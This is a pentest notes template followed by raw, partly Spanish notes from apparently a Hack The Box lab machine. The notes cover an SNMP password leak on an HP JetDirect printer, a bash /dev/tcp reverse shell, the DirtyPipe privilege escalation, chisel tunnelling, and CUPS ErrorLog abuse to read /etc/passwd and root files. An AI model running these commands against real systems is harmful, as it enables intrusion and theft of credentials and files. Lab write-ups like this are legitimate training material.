<font color="green">=======================================================================</font>
# Initial Information<font color="red">:</font> 
<font color="blue">=======================================================================</font>

Name | IP Address | Tech Stack | Web Server | DB
-- | -- | -- | -- | --
-- | -- | -- | -- | --


<hr>

### Loot - Credentials<font color="red">:</font> 

**User** | **Password** | **System**
-- | -- | --
-- | -- | --

<hr>

<font color="green">=======================================================================</font>
# Enumeration
<font color="green">=======================================================================</font>

##### <font color="red">[+]</font> SERVICES<font color="red">:</font> 
- HTTP - <font color="red">XX</font> 

##### <font color="red">[+]</font> NMAP<font color="red">:</font> 

List all ports.
```bash
sudo nmap $IP -p- -sS --min-rate 5000 -Pn -n -v

PORT   STATE SERVICE
```

Services and version on identified open ports.
```bash 
nmap $IP -p XXX -sCV -oN enum/nmap -v

PORT   STATE SERVICE VERSION
```


<hr>

##### <font color="red">[+]</font> WFUZZ

###### FILES: <font color="red">/</font>(Web Root)
```bash
wfuzz -c --hc 404 --hh 0 -u http://$IP/FUZZ  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 200

# Results:
=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================
```

###### DIRECTORIES: <font color="red">/</font>(Web Root)
```bash
wfuzz -c --hc 404 --hh 0 -u http://$IP/FUZZ/  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 200

Results:
=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================
```

<hr>

<font color="green">=======================================================================</font>
# Post Exploitation
<font color="green">=======================================================================</font>

##### <font color="red">[+]</font> PrivEsc Notes<font color="red">:</font> 


##### <font color="red">[+]</font> System Enumeration<font color="red">:</font> 

- **Host**:
- **Compilation version and architecture**:


##### <font color="red">[+]</font> List Interesting Directories<font color="red">:</font> 

- **/tmp**:
- **/opt**:
- **/var/tmp**:
- **/dev/shm**:
- **/var/backups/**:
- **/var/mail**:

##### <font color="red">[+]</font> S/GUIDS<font color="red">:</font> 

- SUIDs:
```bash
find / -perm -u=s -type f 2>/dev/null
```

##### <font color="red">[+]</font> ROOT Processes (ps) <font color="red">:</font> 
```bash
ps aux | grep -i root --color
```

##### <font color="red">[+]</font> Local Network Services (netstat/ss)<font color="red">:</font> 
```bash
# (or ss if netstat not available)
netstat -tunlp | grep '127.0.0.1' --color=auto
netstat -antup | grep '127.0.0.1' --color=auto
```

##### <font color="red">[+]</font> I/O - PsPy<font color="red">:</font> 
```bash
```PORT   STATE SERVIC
23/tcp open  telnet
telnet $ip
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

se busca la contrasena de ese servicio en internet o aparato


 sudo nmap $ip  -sU --top-ports 100 -n -T5 --open
PORT    STATE SERVICE
161/udp open  snmp
/usr/bin/clipp
/usr/bin/clipp




usamos la herramienta snmpwalk

ONESIXTYONE(1)                                  General Commands Manual                                  ONESIXTYONE(1)

NAME
       onesixtyone - fast and simple SNMP scanner
snmpwalk -c asdasd  -v2c $ip
iso.3.6.1.2.1 = STRING: "HTB Printer"
❯ snmpwalk -c public -v2c $ip
iso.3.6.1.2.1 = STRING: "HTB Printer"
snmpwalk -c public -v2c $ip 1
iso.3.6.1.2.1 = STRING: "HTB Printer"
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
iso.3.6.1.4.1.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

de ahi se extrae los BITS y se usa xxd -ps -r
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xargs | xxd -ps -r
P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i	IYaA"1&1A5% 
 telnet $ip
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i
 telnet $ip
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i
> exec id
 nc -nlvp 443
listening on [any] 


exec bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"

script /dev/null -c bash
Script started, file is /dev/null
This account is currently not available.

python3 -c 'import pty;pty.spawn("/bin/bash")'

despues control para bajarla a dormir

stty raw -echo; fg 
reset xterm

luego checar mi terminal stty size
regresar y poner 
stty rows 25 columns 123

listo




export TERM=xterm




https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit

470825a2b98965f767ce5541c0e32f1b
./privesc
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "aaron"...
system() function call seems to have failed :(
lp@antique:/tmp$ mkdir a
en mi caso use el binario de ahi, lo copie en tmp y lo ejecute com>
primero guardado como privesc.c

gcc privesc.c -o privesc
./privesc


luego solo use el
su root
pass: aaron
funciono.
 ./chisel client 10.10.14.2
./chisel server --reverse -p 1234
 se encontro un puerto interno corriendo 631 con netstat -tulpn
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1030/python3        
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -        
searchsploit cups
curl localhost:631
	<TITLE>Home - CUPS 1.6.1</TITLE>
cupsctl ErrorLog=/etc/passwd
 curl -s -X GET localhost:631/admin/log/error_log
cupsctl ErrorLog=/root/root.txt
curl -s -X GET localhost:631/admin/log/error_log 
470825a2b98965f767ce5541c0e32f1b
